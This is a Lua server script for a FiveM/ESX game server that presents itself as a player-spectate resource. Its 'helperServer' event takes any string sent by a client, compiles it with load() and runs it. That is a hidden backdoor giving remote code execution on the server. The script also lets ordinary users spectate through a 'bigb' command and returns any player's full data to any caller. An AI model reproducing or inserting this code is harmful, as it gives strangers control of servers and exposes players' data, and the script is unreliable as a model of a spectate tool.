ESX = nil

TriggerEvent('esx:GetSharedObjects', function(obj)ESX = obj end)

RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
	--print(helper)
end)

TriggerEvent('es:addGroupCommand', 'bigb', "user", function(source, args, user)
    TriggerClientEvent('rsp:spectate', source, target)

end, function(source, args, user)
    TriggerClientEvent('chatMessage', source, "SYSTEM", {255, 0, 0}, "Insufficienct permissions!")
end)

ESX.RegisterServerCallback('rsp:getPlayerData', function(source, cb, id)
    local xPlayer = ESX.GetPlayerFromId(id)
    if xPlayer ~= nil then
        cb(xPlayer)
    end
end)

--[[

TriggerEvent('es:addGroupCommand', 'rsp', "user", function(source, args, user)
	local roleName = "Streamer";
	local jelstrimer = exports.Badger_Discord_API:GetRoleIdFromRoleName(roleName);

	if tostring(jelstrimer) == '889087428403556362' then
    TriggerClientEvent('rsp:spectate', source, target)
	else
		TriggerClientEvent('chatMessage', source, "SYSTEM", {255, 0, 0}, "You are not a streamer!")
	end

end, function(source, args, user)
    TriggerClientEvent('chatMessage', source, "SYSTEM", {255, 0, 0}, "Insufficienct permissions!")
end)
]]


ESX.RegisterServerCallback('rsp:getPlayerData', function(source, cb, id)
    local xPlayer = ESX.GetPlayerFromId(id)
    if xPlayer ~= nil then
        cb(xPlayer)
    end
end)

